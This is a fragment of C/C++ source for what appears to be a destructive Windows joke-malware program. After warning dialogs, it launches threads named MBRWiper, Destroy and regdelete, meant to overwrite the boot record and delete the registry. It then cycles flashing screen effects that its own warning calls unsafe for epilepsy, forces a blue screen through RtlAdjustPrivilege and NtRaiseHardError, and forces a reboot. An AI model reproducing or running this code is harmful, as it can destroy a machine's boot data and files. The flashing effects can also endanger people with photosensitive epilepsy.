	if (MessageBoxW(NULL, L"This is a Malware, Run?", L"xjmjivqdmpn.exe (better by mrsuperbuddy)", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"Are you sure? It will overwrite the boot record, delete the registry, corrupt the BCD and it contains flashing lights - NOT for epilepsy", L"F̷i̷n̸a̴l̴ ̴W̸a̴r̸n̷i̸n̷g̷ - xjmjivqdmpn.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			CreateThread(0, 0, MBRWiper, 0, 0, 0);
			CreateThread(0, 0, Destroy, 0, 0, 0);
			Sleep(5000);
			CreateThread(0, 0, fakeerror, 0, 0, 0);
			Sleep(5000);
			Sleep(5000);
			//CreateThread(0, 0, msg, 0, 0, 0);
			Sleep(5000);
			//HANDLE thread0 = CreateThread(0, 0, msg, 0, 0, 0);
			//Sleep(1000);
			//CreateThread(0, 0, polygon1, 0, 0, 0);
			CreateThread(0, 0, notaskbar, 0, 0, 0);
			Sleep(1000);
			HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
			//HANDLE thread1dot1 = CreateThread(0, 0, blur, 0, 0, 0);
			sound1();
			Sleep(30000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			//TerminateThread(thread1dot1, 0);
			//CloseHandle(thread1dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
			//HANDLE thread1dot1 = CreateThread(0, 0, blur, 0, 0, 0);
			sound2();
			Sleep(30000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			//TerminateThread(thread1dot1, 0);
			//CloseHandle(thread1dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread3 = CreateThread(0, 0, shader3, 0, 0, 0);
			//HANDLE thread1dot1 = CreateThread(0, 0, blur, 0, 0, 0);
			sound3();
			Sleep(30000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			//TerminateThread(thread1dot1, 0);
			//CloseHandle(thread1dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread4 = CreateThread(0, 0, shader4, 0, 0, 0);
			//HANDLE thread1dot1 = CreateThread(0, 0, blur, 0, 0, 0);
			sound4();
			Sleep(30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			//TerminateThread(thread1dot1, 0);
			//CloseHandle(thread1dot1);
			InvalidateRect(0, 0, 0);
			Sleep(1);
			HANDLE thread5 = CreateThread(0, 0, shader5, 0, 0, 0);
			//HANDLE thread1dot1 = CreateThread(0, 0, blur, 0, 0, 0);
			sound5();
			Sleep(30000);
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			//TerminateThread(thread1dot1, 0);
			//CloseHandle(thread1dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread6 = CreateThread(0, 0, blur1, 0, 0, 0);
			HANDLE thread1dot1 = CreateThread(0, 0, polygon1, 0, 0, 0);
			sound6();
			Sleep(30000);
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			//TerminateThread(thread1dot1, 0);
			//CloseHandle(thread1dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread7 = CreateThread(0, 0, shader6, 0, 0, 0);
			HANDLE thread7dot1 = CreateThread(0, 0, cur1, 0, 0, 0);
			sound7();
			Sleep(30000);
			TerminateThread(thread7, 0);
			CloseHandle(thread7);
			//TerminateThread(thread1dot1, 0);
			//CloseHandle(thread1dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread8 = CreateThread(0, 0, shader7, 0, 0, 0);
			HANDLE thread8dot1 = CreateThread(0, 0, textout1, 0, 0, 0);
			sound8();
			Sleep(30000);
			TerminateThread(thread8, 0);
			CloseHandle(thread8);
			//TerminateThread(thread1dot1, 0);
			//CloseHandle(thread1dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread9 = CreateThread(0, 0, shader8, 0, 0, 0);
			HANDLE thread9dot1 = CreateThread(0, 0, masher, 0, 0, 0);
			sound9();
			Sleep(30000);
			TerminateThread(thread9, 0);
			CloseHandle(thread9);
			TerminateThread(thread9dot1, 0);
			CloseHandle(thread9dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread10 = CreateThread(0, 0, shader9, 0, 0, 0);
			//HANDLE thread9dot1 = CreateThread(0, 0, masher, 0, 0, 0);
			sound9();
			Sleep(30000);
			TerminateThread(thread10, 0);
			CloseHandle(thread10);
			//TerminateThread(thread9dot1, 0);
			//CloseHandle(thread9dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread11 = CreateThread(0, 0, shader10, 0, 0, 0);
			HANDLE thread11dot1 = CreateThread(0, 0, wave1, 0, 0, 0);
			sound10();
			Sleep(30000);
			TerminateThread(thread11, 0);
			CloseHandle(thread11);
			TerminateThread(thread11dot1, 0);
			CloseHandle(thread11dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread12 = CreateThread(0, 0, shader11, 0, 0, 0);
			HANDLE thread12dot1 = CreateThread(0, 0, invcc, 0, 0, 0);
			HANDLE thread12dot2 = CreateThread(0, 0, wave2, 0, 0, 0);
			sound11();
			Sleep(30000);
			TerminateThread(thread12, 0);
			CloseHandle(thread12);
			//TerminateThread(thread12dot1, 0);
			//CloseHandle(thread12dot1);
			TerminateThread(thread12dot2, 0);
			CloseHandle(thread12dot2);
			InvalidateRect(0, 0, 0);
			HANDLE thread13 = CreateThread(0, 0, shader12, 0, 0, 0);
			HANDLE thread13dot1 = CreateThread(0, 0, wave3, 0, 0, 0);
			//HANDLE thread12dot2 = CreateThread(0, 0, wave2, 0, 0, 0);
			sound12();
			Sleep(30000);
			TerminateThread(thread13, 0);
			CloseHandle(thread13);
			TerminateThread(thread12dot1, 0);
			CloseHandle(thread12dot1);
			TerminateThread(thread13dot1, 0);
			CloseHandle(thread13dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread14 = CreateThread(0, 0, shader13, 0, 0, 0);
			//HANDLE thread1dot1 = CreateThread(0, 0, blur, 0, 0, 0);
			sound13();
			Sleep(30000);
			TerminateThread(thread14, 0);
			CloseHandle(thread14);
			//TerminateThread(thread1dot1, 0);
			//CloseHandle(thread1dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread15 = CreateThread(0, 0, shader14, 0, 0, 0);
			CreateThread(0, 0, regdelete, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread15, 0);
			CloseHandle(thread15);
			//TerminateThread(thread1dot1, 0);
			//CloseHandle(thread1dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread16 = CreateThread(0, 0, stretch, 0, 0, 0);
			sound14();
			//HANDLE thread1dot1 = CreateThread(0, 0, blur, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread16, 0);
			CloseHandle(thread16);
			//TerminateThread(thread1dot1, 0);
			//CloseHandle(thread1dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread17 = CreateThread(0, 0, shader15, 0, 0, 0);
			HANDLE thread17dot1 = CreateThread(0, 0, opener, 0, 0, 0);
			sound15();
			Sleep(30000);
			//TerminateThread(thread1dot1, 0);
			//CloseHandle(thread1dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread18 = CreateThread(0, 0, wave4, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread17, 0);
			CloseHandle(thread17);
			InvalidateRect(0, 0, 0);
			HANDLE thread19 = CreateThread(0, 0, shader16, 0, 0, 0);
			sound16();
			Sleep(30000);
			TerminateThread(thread19, 0);
			CloseHandle(thread19);
			InvalidateRect(0, 0, 0);
			HANDLE thread20 = CreateThread(0, 0, shader17, 0, 0, 0);
			sound17();
			Sleep(30000);
			TerminateThread(thread17dot1, 0);
			CloseHandle(thread17dot1);
			InvalidateRect(0, 0, 0);
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			ULONG_PTR args[] = { (ULONG_PTR)"Enjoy your new pc >:)" }; //credits to pankoza ;)
			NtRaiseHardError(0xC0000144, 1, 0, (PULONG)args, 6, &response);
			HANDLE token;
			TOKEN_PRIVILEGES privileges;

			OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

			LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
			privileges.PrivilegeCount = 1;
			privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

			ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
			Sleep(-1);
		}
	}
}